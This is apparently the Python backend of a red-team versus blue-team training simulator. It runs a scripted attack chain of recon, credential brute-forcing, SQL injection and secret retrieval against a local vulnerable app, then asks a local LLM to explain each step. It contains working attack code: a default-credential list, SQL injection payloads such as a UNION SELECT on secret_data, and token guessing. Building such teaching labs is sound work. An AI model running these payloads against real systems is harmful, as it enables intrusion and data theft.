"""
Secure-LLM Pro — FastAPI Backend
Main API server for the AI Red-Team vs Blue-Team Simulator.
Runs on port 8000.
"""

import sys
import os
import uuid
import asyncio
import json
from datetime import datetime
from typing import Optional

import requests
from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel

# Add parent to path
sys.path.insert(0, os.path.dirname(__file__))

from database import (
    init_db, insert_log, insert_command, insert_risk_event, insert_chat,
    insert_session_report, get_logs, get_commands, get_risk_events,
    get_chat_history, clear_all,
)
from ollama_client import explain_attack_step, chat_response, generate_tutorial, score_llm_quality
from pdf_export import generate_session_pdf

# ─── App Setup ───────────────────────────────────────────────
app = FastAPI(title="Secure-LLM Pro", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize DB on startup
init_db()

# ─── Session State ───────────────────────────────────────────
VICTIM_URL = "http://localhost:5001"

session_state = {
    "session_id": str(uuid.uuid4())[:8],
    "current_step": -1,
    "red_score": 0.0,
    "blue_score": 0.0,
    "llm_score": 0.0,
    "steps_completed": [],
    "scenario": None,
    "explanations": [],
}

# ─── Attack Scenario Definition ──────────────────────────────
ATTACK_SCENARIO = {
    "name": "Multi-Vector Intrusion Simulation",
    "description": "A simulated multi-step attack chain targeting a vulnerable web application. "
                   "Covers reconnaissance, brute-force authentication, SQL injection, and sensitive data exfiltration.",
    "difficulty": "Intermediate",
    "steps": [
        {
            "name": "Reconnaissance",
            "description": "Probe the target application to discover available endpoints and gather information about the system.",
            "attack_type": "Information Gathering",
            "action": "recon",
        },
        {
            "name": "Brute-Force Login",
            "description": "Attempt to break into the admin account using common credential combinations.",
            "attack_type": "Authentication Attack",
            "action": "bruteforce",
        },
        {
            "name": "SQL Injection",
            "description": "Exploit the search endpoint using SQL injection to extract data from the database.",
            "attack_type": "Injection Attack",
            "action": "sqli",
        },
        {
            "name": "Sensitive Data Exfiltration",
            "description": "Use the obtained access token to retrieve sensitive configuration and secret data.",
            "attack_type": "Data Exfiltration",
            "action": "exfiltrate",
        },
    ],
}


# ─── Pydantic Models ─────────────────────────────────────────
class ChatRequest(BaseModel):
    message: str
    session_id: Optional[str] = None


class TutorialRequest(BaseModel):
    topic: str


# ─── Helper: Execute Attack Steps ────────────────────────────
def execute_recon():
    """Phase 1: Reconnaissance — probe target endpoints."""
    results = {"endpoints_found": [], "info": {}, "success": False}
    try:
        r = requests.get(f"{VICTIM_URL}/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            results["endpoints_found"] = data.get("endpoints", [])
            results["info"] = data
            results["success"] = True
            results["detail"] = f"Target is running: {data.get('app', 'Unknown')} v{data.get('version', '?')}"
        else:
            results["detail"] = f"Target returned status {r.status_code}"
    except requests.ConnectionError:
        results["detail"] = "Target is unreachable — connection refused"
    except Exception as e:
        results["detail"] = f"Recon error: {str(e)[:100]}"
    return results


def execute_bruteforce():
    """Phase 2: Brute-force — try common credentials."""
    credentials = [
        ("admin", "password"),
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "admin123"),
        ("root", "root"),
        ("root", "toor"),
    ]
    results = {"attempts": [], "success": False, "token": None}

    for username, password in credentials:
        try:
            r = requests.post(
                f"{VICTIM_URL}/login",
                json={"username": username, "password": password},
                timeout=5,
            )
            attempt = {
                "username": username,
                "password": password,
                "status": r.status_code,
                "response": r.json() if r.headers.get("content-type", "").startswith("application/json") else {},
            }
            results["attempts"].append(attempt)

            if r.status_code == 200:
                data = r.json()
                if data.get("success"):
                    results["success"] = True
                    results["token"] = data.get("token", "")
                    results["cracked_user"] = username
                    results["cracked_pass"] = password
                    results["detail"] = f"Credentials found: {username}:{password}"
                    break
        except Exception as e:
            results["attempts"].append({"username": username, "error": str(e)[:100]})

    if not results["success"]:
        results["detail"] = f"Brute-force failed after {len(results['attempts'])} attempts"

    return results


def execute_sqli():
    """Phase 3: SQL Injection — exploit search endpoint."""
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT id, key, value, NULL, NULL FROM secret_data --",
        "security",  # Normal query for comparison
    ]
    results = {"injections": [], "success": False, "data_leaked": []}

    for payload in payloads:
        try:
            r = requests.get(f"{VICTIM_URL}/search", params={"q": payload}, timeout=5)
            injection = {
                "payload": payload,
                "status": r.status_code,
                "response": r.json() if r.headers.get("content-type", "").startswith("application/json") else {},
            }
            results["injections"].append(injection)

            if r.status_code == 200:
                data = r.json()
                if data.get("injection_detected"):
                    results["success"] = True
                    results["data_leaked"].extend(data.get("results", []))
        except Exception as e:
            results["injections"].append({"payload": payload, "error": str(e)[:100]})

    if results["success"]:
        results["detail"] = f"SQL injection succeeded — {len(results['data_leaked'])} records exposed"
    else:
        results["detail"] = "SQL injection attempts did not extract additional data"

    return results


def execute_exfiltrate(token=None):
    """Phase 4: Data Exfiltration — access sensitive config."""
    results = {"success": False, "secrets": []}

    if not token:
        # Try without token first
        try:
            r = requests.get(f"{VICTIM_URL}/config", timeout=5)
            results["no_token_status"] = r.status_code
        except:
            pass

        # Try common tokens
        for guess in ["admin", "admin-secret-token-2024", "bearer-token"]:
            try:
                r = requests.get(
                    f"{VICTIM_URL}/config",
                    params={"token": guess},
                    timeout=5,
                )
                if r.status_code == 200:
                    data = r.json()
                    results["success"] = True
                    results["secrets"] = data.get("secrets", [])
                    results["server_info"] = data.get("server_info", {})
                    token = guess
                    break
            except:
                continue
    else:
        try:
            r = requests.get(
                f"{VICTIM_URL}/config",
                headers={"Authorization": f"Bearer {token}"},
                timeout=5,
            )
            if r.status_code == 200:
                data = r.json()
                results["success"] = True
                results["secrets"] = data.get("secrets", [])
                results["server_info"] = data.get("server_info", {})
        except Exception as e:
            results["error"] = str(e)[:100]

    if results["success"]:
        results["detail"] = f"Exfiltration successful — {len(results['secrets'])} secrets retrieved"
    else:
        results["detail"] = "Exfiltration failed — could not access sensitive data"

    return results


STEP_EXECUTORS = {
    "recon": execute_recon,
    "bruteforce": execute_bruteforce,
    "sqli": execute_sqli,
    "exfiltrate": execute_exfiltrate,
}


# ─── API Endpoints ───────────────────────────────────────────

@app.get("/")
async def root():
    return {
        "app": "Secure-LLM Pro Backend",
        "version": "1.0.0",
        "status": "running",
        "session_id": session_state["session_id"],
    }


@app.get("/scenario")
async def get_scenario():
    """Get the current attack scenario."""
    return {
        "scenario": ATTACK_SCENARIO,
        "session_id": session_state["session_id"],
        "current_step": session_state["current_step"],
        "total_steps": len(ATTACK_SCENARIO["steps"]),
        "scores": {
            "red": session_state["red_score"],
            "blue": session_state["blue_score"],
            "llm": session_state["llm_score"],
        },
        "steps_completed": session_state["steps_completed"],
    }


@app.post("/next_step")
async def next_step():
    """Execute the next attack step in the scenario."""
    global session_state

    next_idx = session_state["current_step"] + 1
    total = len(ATTACK_SCENARIO["steps"])

    if next_idx >= total:
        return {
            "complete": True,
            "message": "All attack steps have been completed.",
            "session_id": session_state["session_id"],
            "final_scores": {
                "red": session_state["red_score"],
                "blue": session_state["blue_score"],
                "llm": session_state["llm_score"],
            },
        }

    step = ATTACK_SCENARIO["steps"][next_idx]
    session_state["current_step"] = next_idx

    # Log the step start
    insert_log(
        "RED-TEAM", "INFO",
        f"Executing step {next_idx + 1}: {step['name']}",
        step_index=next_idx,
        session_id=session_state["session_id"],
    )

    # Execute the attack
    action = step["action"]
    executor = STEP_EXECUTORS.get(action)

    if action == "exfiltrate":
        # Pass token from brute-force if available
        token = None
        for completed in session_state["steps_completed"]:
            if completed.get("action") == "bruteforce" and completed.get("result", {}).get("token"):
                token = completed["result"]["token"]
        result = executor(token) if executor else {"success": False, "detail": "Unknown action"}
    else:
        result = executor() if executor else {"success": False, "detail": "Unknown action"}

    success = result.get("success", False)

    # Update scores
    if success:
        session_state["red_score"] = min(100, session_state["red_score"] + 25)
        session_state["blue_score"] = max(0, session_state["blue_score"] - 5)
        insert_log(
            "RED-TEAM", "CRITICAL",
            f"Attack succeeded: {step['name']} — {result.get('detail', '')}",
            step_index=next_idx,
            session_id=session_state["session_id"],
        )
        insert_log(
            "BLUE-TEAM", "WARNING",
            f"Defense failed against: {step['name']}",
            step_index=next_idx,
            session_id=session_state["session_id"],
        )
    else:
        session_state["blue_score"] = min(100, session_state["blue_score"] + 20)
        session_state["red_score"] = max(0, session_state["red_score"] - 5)
        insert_log(
            "BLUE-TEAM", "INFO",
            f"Attack blocked: {step['name']} — {result.get('detail', '')}",
            step_index=next_idx,
            session_id=session_state["session_id"],
        )

    # Get LLM explanation
    llm_explanation = ""
    try:
        llm_explanation = await explain_attack_step(
            step["name"],
            step["description"] + " | " + result.get("detail", ""),
            success,
        )
        # Score the explanation quality
        llm_quality = await score_llm_quality(llm_explanation)
        session_state["llm_score"] = round(
            (session_state["llm_score"] * max(1, next_idx) + llm_quality) / (next_idx + 1), 1
        )
    except Exception as e:
        llm_explanation = f"[LLM unavailable]: {str(e)[:100]}. The {step['name']} step {'succeeded' if success else 'was blocked'}."
        session_state["llm_score"] = max(session_state["llm_score"], 30)

    insert_log(
        "LLM", "INFO",
        f"Analysis: {llm_explanation[:200]}",
        step_index=next_idx,
        session_id=session_state["session_id"],
    )

    # Record risk event
    insert_risk_event(
        event_type=step["attack_type"],
        red_score=session_state["red_score"],
        blue_score=session_state["blue_score"],
        llm_score=session_state["llm_score"],
        description=f"{step['name']}: {'SUCCESS' if success else 'BLOCKED'}",
        step_index=next_idx,
        session_id=session_state["session_id"],
    )

    # Store completed step
    completed_step = {
        "index": next_idx,
        "name": step["name"],
        "action": step["action"],
        "attack_type": step["attack_type"],
        "description": step["description"],
        "success": success,
        "result": result,
        "llm_explanation": llm_explanation,
    }
    session_state["steps_completed"].append(completed_step)
    session_state["explanations"].append({
        "title": step["name"],
        "content": llm_explanation,
    })

    return {
        "step_index": next_idx,
        "step": step,
        "success": success,
        "result": result,
        "llm_explanation": llm_explanation,
        "scores": {
            "red": session_state["red_score"],
            "blue": session_state["blue_score"],
            "llm": session_state["llm_score"],
        },
        "complete": next_idx >= total - 1,
        "remaining": total - next_idx - 1,
    }


@app.post("/chat")
async def chat_endpoint(req: ChatRequest):
    """Interactive chat with the AI cybersecurity assistant."""
    sid = req.session_id or session_state["session_id"]

    # Store user message
    insert_chat("user", req.message, sid)
    insert_command(req.message, session_id=sid)

    # Get conversation history
    history = get_chat_history(sid, limit=20)

    # Generate response
    try:
        response = await chat_response(req.message, history)
    except Exception as e:
        response = f"I'm having trouble connecting to the AI engine. Error: {str(e)[:100]}. Please ensure Ollama is running with 'ollama serve'."

    # Store assistant response
    insert_chat("assistant", response, sid)
    insert_command(req.message, response=response, session_id=sid)

    return {
        "response": response,
        "session_id": sid,
        "timestamp": datetime.now().isoformat(),
    }


@app.post("/risk_chat")
async def risk_chat_endpoint(req: ChatRequest):
    """Chat specifically about risk analysis and current session state."""
    sid = req.session_id or session_state["session_id"]

    context = (
        f"Current session state:\n"
        f"- Red Team Score: {session_state['red_score']}\n"
        f"- Blue Team Score: {session_state['blue_score']}\n"
        f"- LLM Analysis Score: {session_state['llm_score']}\n"
        f"- Steps completed: {len(session_state['steps_completed'])}/{len(ATTACK_SCENARIO['steps'])}\n"
        f"- Completed steps: {', '.join(s['name'] for s in session_state['steps_completed'])}\n\n"
        f"User question: {req.message}"
    )

    insert_chat("user", req.message, sid)

    try:
        response = await chat_response(context)
    except Exception as e:
        response = f"Risk analysis unavailable: {str(e)[:100]}"

    insert_chat("assistant", response, sid)

    return {
        "response": response,
        "scores": {
            "red": session_state["red_score"],
            "blue": session_state["blue_score"],
            "llm": session_state["llm_score"],
        },
    }


@app.post("/tutorial")
async def tutorial_endpoint(req: TutorialRequest):
    """Generate a tutorial for a cybersecurity topic."""
    try:
        content = await generate_tutorial(req.topic)
    except Exception as e:
        content = f"Tutorial generation failed: {str(e)[:100]}"

    insert_log("TUTORIAL", "INFO", f"Tutorial requested: {req.topic}", session_id=session_state["session_id"])

    return {
        "topic": req.topic,
        "content": content,
        "timestamp": datetime.now().isoformat(),
    }


@app.get("/db/logs")
async def api_get_logs(session_id: Optional[str] = None, limit: int = 100):
    """Get logs from the database."""
    return {"logs": get_logs(session_id or session_state["session_id"], limit)}


@app.get("/db/commands")
async def api_get_commands(session_id: Optional[str] = None, limit: int = 50):
    """Get command history from the database."""
    return {"commands": get_commands(session_id or session_state["session_id"], limit)}


@app.get("/db/risk_events")
async def api_get_risk_events(session_id: Optional[str] = None, limit: int = 100):
    """Get risk events from the database."""
    return {"risk_events": get_risk_events(session_id or session_state["session_id"], limit)}


@app.get("/db/chat_history")
async def api_get_chat_history(session_id: Optional[str] = None, limit: int = 50):
    """Get chat history from the database."""
    return {"chat_history": get_chat_history(session_id or session_state["session_id"], limit)}


@app.get("/scores")
async def get_scores():
    """Get current risk scores."""
    return {
        "red": session_state["red_score"],
        "blue": session_state["blue_score"],
        "llm": session_state["llm_score"],
        "session_id": session_state["session_id"],
    }


@app.post("/reset")
async def reset_session():
    """Reset the entire session."""
    global session_state

    old_session = session_state["session_id"]
    clear_all(old_session)

    # Reset victim app
    try:
        requests.post(f"{VICTIM_URL}/reset", timeout=5)
    except:
        pass

    session_state = {
        "session_id": str(uuid.uuid4())[:8],
        "current_step": -1,
        "red_score": 0.0,
        "blue_score": 0.0,
        "llm_score": 0.0,
        "steps_completed": [],
        "scenario": None,
        "explanations": [],
    }

    insert_log("SYSTEM", "INFO", "Session reset", session_id=session_state["session_id"])

    return {
        "success": True,
        "message": "Session has been reset",
        "new_session_id": session_state["session_id"],
    }


@app.post("/export_pdf")
async def export_pdf():
    """Export the current session as a PDF report."""
    pdf_data = {
        "scores": {
            "red": session_state["red_score"],
            "blue": session_state["blue_score"],
            "llm": session_state["llm_score"],
        },
        "steps": session_state["steps_completed"],
        "logs": get_logs(session_state["session_id"], limit=50),
        "explanations": session_state.get("explanations", []),
    }

    try:
        filepath = generate_session_pdf(pdf_data)
        insert_session_report(
            session_id=session_state["session_id"],
            total_steps=len(session_state["steps_completed"]),
            red_final=session_state["red_score"],
            blue_final=session_state["blue_score"],
            llm_final=session_state["llm_score"],
            summary=f"Session report with {len(session_state['steps_completed'])} steps completed",
            pdf_path=filepath,
        )
        return FileResponse(
            filepath,
            media_type="application/pdf",
            filename=os.path.basename(filepath),
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"PDF generation failed: {str(e)}")


if __name__ == "__main__":
    import uvicorn
    print("=" * 50)
    print("  SECURE-LLM PRO — Backend API")
    print("  Running on http://localhost:8000")
    print("=" * 50)
    uvicorn.run(app, host="0.0.0.0", port=8000)
